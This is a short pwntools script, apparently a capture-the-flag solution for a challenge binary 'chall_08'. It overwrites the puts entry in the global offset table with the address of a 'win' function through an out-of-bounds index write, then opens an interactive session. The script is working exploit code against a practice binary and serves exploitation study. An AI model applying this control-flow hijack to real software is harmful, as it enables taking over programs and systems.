#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_08')

p = process(binary.path)

payload1 = str((binary.got.puts - binary.sym.target) // 8)
payload2 = str(binary.sym.win)
print(payload1)
print(payload2)

p.sendline(payload2)
p.sendline(payload1)
p.interactive()
